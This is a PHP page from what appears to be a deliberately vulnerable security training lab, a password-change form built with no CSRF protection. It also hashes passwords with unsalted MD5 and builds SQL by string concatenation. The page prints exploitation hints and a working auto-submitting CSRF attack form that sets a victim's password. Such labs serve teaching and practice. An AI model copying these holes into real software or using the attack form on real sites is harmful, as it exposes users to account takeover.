<?php
require_once 'config.php';

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

$message = '';
$error = '';

// VULNERABLE: CSRF - No token validation
// User can change their password by POST request without any CSRF protection
// An attacker can host a malicious page that submits a form to change the victim's password

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $new_password = $_POST['new_password'] ?? '';
    $confirm_password = $_POST['confirm_password'] ?? '';
    
    if ($new_password !== $confirm_password) {
        $error = "Passwords do not match!";
    } elseif (strlen($new_password) < 5) {
        $error = "Password must be at least 5 characters!";
    } else {
        // Update password without any CSRF token verification
        $user_id = $_SESSION['user_id'];
        $hashed_password = md5($new_password);
        
        $query = "UPDATE users SET password='" . $hashed_password . "' WHERE id=" . $user_id;
        
        if ($mysqli->query($query)) {
            $message = "Password changed successfully!";
        } else {
            $error = "Error changing password: " . $mysqli->error;
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>DVWA - CSRF</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .back-link {
            color: #f00;
            text-decoration: none;
            margin-bottom: 20px;
            display: inline-block;
        }
        .back-link:hover {
            text-decoration: underline;
        }
        h1 {
            color: #f00;
        }
        .info-box {
            background-color: #222;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #f00;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="password"] {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            background-color: #333;
            color: #fff;
            border: 1px solid #555;
            border-radius: 3px;
        }
        button {
            padding: 10px 20px;
            background-color: #f00;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        button:hover {
            background-color: #c00;
        }
        .message {
            background-color: #1a3a1a;
            color: #6b6;
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 15px;
        }
        .error {
            background-color: #5c2121;
            color: #ff6b6b;
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 15px;
        }
        .hint {
            background-color: #1a3a1a;
            color: #6b6;
            padding: 10px;
            border-radius: 3px;
            margin-top: 10px;
            font-size: 12px;
        }
        .csrf-info {
            background-color: #5c2121;
            color: #ff9999;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="dashboard.php" class="back-link">← Back to Dashboard</a>
        
        <h1>CSRF Lab - Change Password</h1>
        
        <div class="info-box">
            <h2>Cross-Site Request Forgery</h2>
            <p>Change your password. This form has NO CSRF token protection!</p>
        </div>
        
        <?php if ($message): ?>
            <div class="message"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        
        <?php if ($error): ?>
            <div class="error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>
        
        <form method="POST">
            <div class="form-group">
                <label for="new_password">New Password</label>
                <input type="password" id="new_password" name="new_password" required>
            </div>
            
            <div class="form-group">
                <label for="confirm_password">Confirm Password</label>
                <input type="password" id="confirm_password" name="confirm_password" required>
            </div>
            
            <button type="submit">Change Password</button>
        </form>
        
        <div class="hint">
            <strong>Exploitation Hints:</strong><br>
            • No CSRF token is validated - form can be submitted from any origin<br>
            • Create a malicious HTML file that auto-submits this form<br>
            • Trick user into visiting the malicious page while logged in
        </div>
        
        <div class="csrf-info">
            <h3>⚠️ CSRF Attack Example</h3>
            <p>An attacker could create this HTML and trick you into visiting it:</p>
            <pre>&lt;form action="http://localhost:8000/csrf.php" method="POST"&gt;
    &lt;input type="hidden" name="new_password" value="hacked123"&gt;
    &lt;input type="hidden" name="confirm_password" value="hacked123"&gt;
    &lt;input type="submit" value="Click here"&gt;
&lt;/form&gt;
&lt;script&gt;
    document.forms[0].submit();
&lt;/script&gt;</pre>
            <p>Or embed an iframe that auto-submits the form!</p>
        </div>
    </div>
</body>
</html>
